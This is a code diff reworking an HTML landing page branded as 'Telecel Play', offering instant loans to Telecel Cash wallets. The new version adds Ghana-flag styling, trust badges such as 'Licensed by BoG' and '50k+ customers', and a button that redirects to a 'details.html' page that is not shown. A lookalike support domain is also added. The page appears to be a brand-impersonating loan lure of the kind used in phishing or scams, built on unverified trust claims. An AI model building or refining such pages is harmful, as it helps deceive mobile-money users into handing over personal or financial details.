@@ -1,519 +1,427 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
-    <title>Telecel Play – Instant Loan</title>
-    <link rel="icon" href="https://play.telecel.com.gh/favicon.ico" type="image/x-icon">
-    <meta name="theme-color" content="#E30613">
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+    <title>Telecel Play – Instant Loan to Telecel Cash</title>
 
+    <!-- Fonts & Icons -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        html,
+        :root {
+            --telecel-red: #E30613;
+            --telecel-darkred: #b71c1c;
+            --telecel-blue: #0033A0;
+            --telecel-black: #1a1a1a;
+            --telecel-gray: #666666;
+            --telecel-lightgray: #f5f5f5;
+            --shadow: 0 8px 24px rgba(0, 0, 0, 0.08);
+            --shadow-hover: 0 12px 32px rgba(0, 0, 0, 0.12);
+            --border-radius: 20px;
+        }
+
         body {
-            min-height: 100vh;
             font-family: 'Inter', sans-serif;
-            background: #f8f9fc;
-            overflow-x: hidden;
-            overflow-y: auto;
+            background: var(--telecel-lightgray);
+            color: var(--telecel-black);
+            min-height: 100vh;
+            padding: 20px 0;
         }
 
-        body {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 12px;
-            /* reduced for mobile like cheat sheet */
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0 16px;
         }
 
-        header {
-            width: 100%;
-            max-width: 480px;
-            padding: 12px 16px;
+        /* ===== HEADER ===== */
+        .header {
             text-align: center;
-            margin-bottom: 12px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
-        }
-
-        .logo {
-            font-size: clamp(28px, 7vw, 40px);
-            font-weight: 800;
-            letter-spacing: -0.5px;
-        }
-
-        .logo-telecel {
-            color: #E30613;
-        }
-
-        .logo-play {
-            color: #0033A0;
-        }
-
-        .card {
-            background: white;
-            border-radius: 20px;
-            padding: 24px 18px 32px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            position: relative;
-            /* for error box positioning */
-        }
-
-        /* Error box – exact style from cheat sheet */
-        .error-box {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            right: 12px;
-            background: #fff;
-            border: 2px solid #ff4d4d;
-            border-radius: 14px;
-            padding: 12px;
-            display: none;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.12);
-            z-index: 100;
-            text-align: left;
-        }
-
-        .error-title {
-            color: #ff0000;
-            font-weight: bold;
-            font-size: 14px;
-            margin-bottom: 4px;
-        }
-
-        .error-text {
-            color: #444;
-            font-size: 13px;
-        }
-
-        .close {
-            position: absolute;
-            right: 12px;
-            top: 8px;
-            cursor: pointer;
-            font-size: 20px;
-            color: #999;
-        }
-
-        .hero-title {
-            font-size: clamp(22px, 5.5vw, 32px);
-            font-weight: 700;
-            color: #1a1a1a;
-            line-height: 1.2;
-            margin-bottom: 8px;
-        }
-
-        .hero-subtitle {
-            font-size: clamp(14px, 3.5vw, 17px);
-            color: #495057;
-            max-width: 420px;
-            margin: 0 auto 24px;
-            line-height: 1.4;
-            padding: 0 4px;
-        }
-
-        .calc-section {
-            background: #fff5f5;
-            border-radius: 16px;
-            padding: 20px 16px;
-            border: 1px solid #ffebee;
-        }
-
-        .calc-title {
-            font-size: clamp(18px, 4.5vw, 22px);
-            font-weight: 700;
-            color: #2c3e50;
-            margin-bottom: 20px;
-        }
-
-        .input-group {
             margin-bottom: 24px;
         }
 
-        .input-header {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 8px;
-            font-weight: 600;
-            font-size: 14px;
-            color: #2c3e50;
+        .logo {
+            background: white;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 24px;
+            border-radius: 40px;
+            box-shadow: var(--shadow);
+            margin-bottom: 12px;
         }
 
-        .input-label {
-            flex: 1;
-            text-align: left;
-        }
-
-        .loan-input,
-        .loan-select {
-            width: 100%;
-            height: 52px;
-            padding: 0 20px;
-            font-size: 24px;
-            font-weight: 700;
-            color: #E30613;
-            background: #ffffff;
-            border: 2px solid #ffebee;
-            border-radius: 16px;
-            text-align: center;
-            outline: none;
-            font-family: 'Inter', monospace;
-        }
-
-        .loan-select {
-            font-size: 18px;
-            font-weight: 600;
-            color: #1a1a1a;
-            cursor: pointer;
-        }
-
-        .loan-input:focus,
-        .loan-select:focus {
-            border-color: #E30613;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.2);
-        }
-
-        .payment-box {
-            background: #fff5f5;
-            padding: 16px;
-            border-radius: 16px;
-            border: 1px solid #ffebee;
-            margin-top: 20px;
-        }
-
-        .payment-label {
-            display: block;
-            color: #495057;
-            font-size: 14px;
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
-
-        .payment-amount {
-            font-size: clamp(26px, 7vw, 36px);
+        .logo-text {
+            font-size: 2rem;
             font-weight: 800;
-            color: #E30613;
             letter-spacing: -0.5px;
         }
 
-        .apply-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(90deg, #E30613, #b71c1c);
-            color: white;
-            border: none;
-            border-radius: 60px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 6px 18px rgba(227, 6, 19, 0.25);
-            transition: 0.2s ease;
-            margin-bottom: 20px;
-            touch-action: manipulation;
+        .logo-text .telecel {
+            color: var(--telecel-red);
         }
 
-        .apply-btn:active {
-            transform: scale(0.98);
+        .logo-text .play {
+            color: var(--telecel-blue);
         }
 
-        .apply-btn.disabled-btn,
-        .apply-btn:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-            background: linear-gradient(90deg, #b0a0a0, #8a6e6e);
-            transform: none;
+        .tagline {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(227, 6, 19, 0.1);
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--telecel-black);
         }
 
-        .features {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 20px;
-            margin-top: 16px;
+        .flag-small {
+            width: 24px;
+            border-radius: 3px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
 
-        .feature {
-            text-align: center;
-            color: #495057;
-            font-size: 13px;
-            flex: 1 1 100px;
-            max-width: 140px;
-        }
-
-        .feature-icon {
-            font-size: 36px;
-            margin-bottom: 8px;
-            display: block;
-        }
-
-        .disclaimer {
-            font-size: 12px;
-            color: #6c757d;
-            margin-top: 14px;
-            line-height: 1.4;
-        }
-
-        footer {
-            padding: 20px 16px;
-            color: #adb5bd;
-            font-size: 12px;
-            text-align: center;
-            flex-shrink: 0;
-            margin-top: auto;
-        }
-
-        /* Spinner overlay – exact style from cheat sheet */
-        #spinner {
+        /* ===== LOADING OVERLAY ===== */
+        .loading-overlay {
             position: fixed;
             inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(3px);
             display: none;
             align-items: center;
             justify-content: center;
-            background: rgba(255, 255, 255, 0.8);
-            backdrop-filter: blur(2px);
-            z-index: 999;
+            z-index: 1000;
         }
 
-        .loader {
-            width: 44px;
-            height: 44px;
-            border: 4px solid #ffe0e0;
-            border-top: 4px solid #ff0000;
+        .simple-spinner {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #ffffff;
+            border-top: 5px solid var(--telecel-red);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
 
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
-        /* Extra small devices */
-        @media (max-width: 380px) {
-            body {
-                padding: 8px;
-            }
+        /* ===== MAIN CARD ===== */
+        .main-card {
+            background: white;
+            border-radius: var(--border-radius);
+            padding: 28px 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            border: 1px solid rgba(0,0,0,0.05);
+            position: relative;
+        }
 
-            .card {
-                padding: 20px 14px;
-            }
+        .main-card:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--shadow-hover);
+        }
 
-            .calc-section {
-                padding: 16px 12px;
-            }
+        /* Ghana flag stripe (red, gold, green, black star) */
+        .main-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, 
+                #CE1126 0%,    /* Ghana red */
+                #FCD116 25%,   /* Ghana gold */
+                #006B3F 50%,   /* Ghana green */
+                #000000 75%,
+                var(--telecel-red) 100%
+            );
+            border-radius: var(--border-radius) var(--border-radius) 0 0;
+        }
 
-            .loan-input,
-            .loan-select {
-                height: 48px;
-                font-size: 20px;
-            }
+        .loan-label {
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            font-weight: 600;
+            color: var(--telecel-gray);
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
 
-            .apply-btn {
-                font-size: 16px;
-                padding: 12px;
-            }
+        .loan-amount-display {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: var(--telecel-red);
+            margin: 12px 0 8px;
+            position: relative;
+            display: inline-block;
+            text-align: center;
+            width: 100%;
+        }
 
-            .feature {
-                font-size: 12px;
-            }
+        .loan-amount-display::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 35%;
+            right: 35%;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--telecel-red), transparent);
+            border-radius: 2px;
+        }
+
+        .loan-subtext {
+            font-size: 0.9rem;
+            color: var(--telecel-gray);
+            margin: 24px 0 20px;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin: 16px 0 0;
+        }
+
+        .feature {
+            background: rgba(227, 6, 19, 0.05);
+            padding: 14px 8px;
+            border-radius: 14px;
+            text-align: center;
+            font-size: 0.8rem;
+            font-weight: 600;
+            border: 1px solid rgba(227, 6, 19, 0.15);
+            transition: all 0.2s;
+        }
+
+        .feature i {
+            color: var(--telecel-red);
+            font-size: 1.2rem;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .feature:hover {
+            background: rgba(227, 6, 19, 0.1);
+            transform: translateY(-2px);
+        }
+
+        /* CTA Button */
+        .btn-apply {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, var(--telecel-red), var(--telecel-darkred));
+            border: none;
+            border-radius: 60px;
+            font-size: 1rem;
+            font-weight: 800;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 6px 14px rgba(227, 6, 19, 0.3);
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin: 0 0 20px 0;
+        }
+
+        .btn-apply:active {
+            transform: scale(0.98);
+        }
+
+        .btn-apply i {
+            transition: transform 0.2s;
+        }
+
+        .btn-apply:hover i {
+            transform: translateX(4px);
+        }
+
+        /* Trust badges section */
+        .trust-section {
+            background: white;
+            border-radius: var(--border-radius);
+            padding: 24px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .trust-title {
+            text-align: center;
+            font-size: 0.9rem;
+            font-weight: 700;
+            margin-bottom: 20px;
+            position: relative;
+            display: inline-block;
+            width: 100%;
+        }
+
+        .trust-title::after {
+            content: '';
+            position: absolute;
+            bottom: -8px;
+            left: 30%;
+            right: 30%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--telecel-red), transparent);
+        }
+
+        .trust-badges {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .trust-badge {
+            background: #fafafa;
+            padding: 12px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            border: 1px solid #eee;
+            transition: all 0.2s;
+        }
+
+        .trust-badge i {
+            color: var(--telecel-red);
+            font-size: 1rem;
+        }
+
+        .trust-badge:hover {
+            background: rgba(227, 6, 19, 0.05);
+            transform: translateY(-2px);
+        }
+
+        .trust-note {
+            text-align: center;
+            font-size: 0.75rem;
+            color: var(--telecel-gray);
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid #eee;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 8px;
+            padding: 16px;
+            font-size: 0.7rem;
+            color: #888;
+        }
+
+        .footer a {
+            color: var(--telecel-red);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        @media (max-width: 420px) {
+            .logo-text { font-size: 1.6rem; }
+            .loan-amount-display { font-size: 1.8rem; }
         }
     </style>
 </head>
-
 <body>
-    <header>
-        <div class="logo"><span class="logo-telecel">Telecel</span><span class="logo-play">Play</span></div>
-    </header>
-    <main class="card">
-        <!-- Error box (exactly like cheat sheet) -->
-        <div class="error-box" id="errorBox">
-            <div class="close" onclick="hideError()">×</div>
-            <div class="error-title">Error</div>
-            <div class="error-text" id="errorText">Invalid input</div>
-        </div>
 
-        <div>
-            <h1 class="hero-title">Instant Ready Loan on Telecel Cash</h1>
-            <p class="hero-subtitle">Receive a quick loan to your Telecel Cash wallet with fast approval and secure processing.</p>
-
-            <div class="calc-section">
-                <h2 class="calc-title">Estimate Loan & Repayment</h2>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Amount (GH₵)</span>
-                    </div>
-                    <input type="number" class="loan-input" id="amountInput" min="500" max="50000" value="5000" step="100" inputmode="numeric">
-                </div>
-                <div class="input-group">
-                    <div class="input-header">
-                        <span class="input-label">Loan Term (days)</span>
-                    </div>
-                    <select class="loan-select" id="termSelect">
-                        <option value="30" selected>30 days</option>
-                        <option value="60">60 days</option>
-                        <option value="90">90 days</option>
-                    </select>
-                </div>
-                <button class="apply-btn" id="applyBtn">Apply Now</button>
-                <div class="payment-box">
-                    <span class="payment-label">Estimated Total Repayment (Principal + prorated 8.9% fee)</span>
-                    <span class="payment-amount" id="paymentAmount">GH₵5,445.00</span>
-                </div>
-                <p class="disclaimer">Estimate only. Actual terms: 8.9% fee; eligibility-based.</p>
-            </div>
-            <div class="features">
-                <div class="feature">
-                    <div class="feature-icon">⚡</div>Fast Approval<br><small>Often instant for eligible users</small>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">💰</div>8.9% Monthly Fee<br><small>Transparent & competitive</small>
-                </div>
-                <div class="feature">
-                    <div class="feature-icon">🔒</div>Secure Wallet<br><small>Protected transactions</small>
-                </div>
+<div class="container">
+    <!-- Header with Ghana flag -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-text">
+                <span class="telecel">Telecel</span><span class="play">Play</span>
             </div>
         </div>
-    </main>
-    <footer>© 2026 Telecel Ghana – Licensed Mobile Financial Services | Powered by Telecel Cash & Telecel Play</footer>
-
-    <!-- Spinner overlay (cheat sheet style) -->
-    <div id="spinner">
-        <div class="loader"></div>
+        <div class="tagline">
+            <img class="flag-small" src="https://flagcdn.com/w40/gh.png" alt="Ghana flag">
+            Instant loans sent to your Telecel Cash wallet
+        </div>
     </div>
 
-    <script>
-        // ========== DOM elements ==========
-        const amountInput = document.getElementById('amountInput');
-        const termSelect = document.getElementById('termSelect');
-        const paymentAmount = document.getElementById('paymentAmount');
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="simple-spinner"></div>
+    </div>
+
+    <!-- Main card – static loan range -->
+    <div class="main-card">
+        <div class="loan-label">Your instant loan range</div>
+        <div class="loan-amount-display">GH₵ 100 – 50,000</div>
+        <p class="loan-subtext">Funds sent directly to Telecel Cash wallet • 5‑minute approval</p>
+
+        <div class="features">
+            <div class="feature"><i class="fas fa-bolt"></i> Instant disbursement</div>
+            <div class="feature"><i class="fas fa-mobile-alt"></i> No paperwork</div>
+            <div class="feature"><i class="fas fa-shield-alt"></i> Telecel Cash secure</div>
+            <div class="feature"><i class="fas fa-calendar-check"></i> Flexible repayment</div>
+        </div>
+    </div>
+
+    <!-- CTA Button (outside the card) -->
+    <button class="btn-apply" id="applyBtn">
+        Continue with Telecel Cash <i class="fas fa-arrow-right"></i>
+    </button>
+
+    <!-- Trust badges (Ghana specific) -->
+    <div class="trust-section">
+        <div class="trust-title">Trusted by Ghanaians</div>
+        <div class="trust-badges">
+            <div class="trust-badge"><i class="fas fa-lock"></i> SSL Secured</div>
+            <div class="trust-badge"><i class="fas fa-certificate"></i> Licensed by BoG</div>
+            <div class="trust-badge"><i class="fas fa-shield-alt"></i> Data Protection</div>
+            <div class="trust-badge"><i class="fas fa-users"></i> 50k+ customers</div>
+        </div>
+        <div class="trust-note">⭐ Over 50,000 loans disbursed across Ghana ⭐</div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>© 2026 Telecel Ghana – Powered by Telecel Cash</p>
+        <p>Need help? <a href="mailto:support@telecelplay.com.gh">support@telecelplay.com.gh</a></p>
+    </div>
+</div>
+
+<script>
+    (function() {
         const applyBtn = document.getElementById('applyBtn');
-        const spinner = document.getElementById('spinner');
-        const errorBox = document.getElementById('errorBox');
-        const errorText = document.getElementById('errorText');
+        const overlay = document.getElementById('loadingOverlay');
 
-        // ========== Helper: show error (exactly like cheat sheet) ==========
-        function showError(message) {
-            errorText.innerText = message || 'Invalid input. Please check your values.';
-            errorBox.style.display = 'block';
-            // Auto hide after 5 seconds? Cheat sheet doesn't auto-hide, but we keep as user must close.
+        function startApplication() {
+            overlay.style.display = 'flex';
+            setTimeout(() => {
+                overlay.style.display = 'none';
+                window.location.href = 'details.html';  // your existing details page
+            }, 2000);
         }
 
-        function hideError() {
-            errorBox.style.display = 'none';
-        }
+        applyBtn.addEventListener('click', startApplication);
 
-        // ========== Update repayment calculator ==========
-        function updateCalculator() {
-            let amount = parseFloat(amountInput.value);
-            if (isNaN(amount)) amount = 5000;
+        // Ensure overlay hidden on page load / back navigation
+        window.addEventListener('load', () => { overlay.style.display = 'none'; });
+        window.addEventListener('pageshow', () => { overlay.style.display = 'none'; });
+    })();
+</script>
 
-            let days = parseInt(termSelect.value);
-            if (isNaN(days)) days = 30;
-
-            const monthlyFeeRate = 0.089;
-            const dailyFeeRate = monthlyFeeRate / 30;
-            const totalFee = amount * dailyFeeRate * days;
-            const totalRepay = amount + totalFee;
-
-            paymentAmount.textContent = 'GH₵' + totalRepay.toFixed(2);
-        }
-
-        // ========== Validate input ==========
-        function validateInputs() {
-            let amount = parseFloat(amountInput.value);
-            if (isNaN(amount)) {
-                showError('Please enter a valid loan amount.');
-                return false;
-            }
-            if (amount < 500) {
-                showError('Minimum loan amount is GH₵500.');
-                return false;
-            }
-            if (amount > 50000) {
-                showError('Maximum loan amount is GH₵50,000.');
-                return false;
-            }
-            let days = parseInt(termSelect.value);
-            if (isNaN(days) || (days !== 30 && days !== 60 && days !== 90)) {
-                showError('Please select a valid loan term.');
-                return false;
-            }
-            hideError();
-            return true;
-        }
-
-        // ========== Save data & simulate 3-second loading (cheat sheet spinner style) ==========
-        let isProcessing = false;
-
-        function startLoanApplication() {
-            if (isProcessing) return;
-            if (!validateInputs()) return;
-
-            let amount = parseFloat(amountInput.value);
-            let days = parseInt(termSelect.value);
-            const monthlyFeeRate = 0.089;
-            const dailyFeeRate = monthlyFeeRate / 30;
-            const totalFee = amount * dailyFeeRate * days;
-            const totalRepay = amount + totalFee;
-
-            // Store exactly like original (for details.html)
-            localStorage.setItem('loanAmount', amount.toString());
-            localStorage.setItem('loanTerm', days.toString());
-            localStorage.setItem('totalRepayment', totalRepay.toFixed(2));
-
-            // Disable button during loading
-            applyBtn.disabled = true;
-            applyBtn.classList.add('disabled-btn');
-            isProcessing = true;
-
-            // Show spinner exactly like cheat sheet
-            spinner.style.display = 'flex';
-
-            // 3-second loading simulation, then redirect
-            setTimeout(function () {
-                window.location.href = 'details.html';
-            }, 3000);
-        }
-
-        // ========== Event listeners ==========
-        amountInput.addEventListener('input', function () {
-            updateCalculator();
-            hideError(); // clear error when user types
-        });
-        termSelect.addEventListener('change', function () {
-            updateCalculator();
-            hideError();
-        });
-
-        applyBtn.addEventListener('click', startLoanApplication);
-
-        // Initial calculation
-        updateCalculator();
-
-        // Expose hideError globally for close button
-        window.hideError = hideError;
-
-        // Optional: close error if clicking outside? Not needed but matches cheat sheet.
-        document.addEventListener('click', function (e) {
-            if (!e.target.closest('.error-box') && errorBox.style.display === 'block') {
-                // Cheat sheet doesn't auto-close on outside click, but we keep behavior as is.
-                // We'll leave it; only close button closes.
-            }
-        });
-    </script>
 </body>
-
 </html>
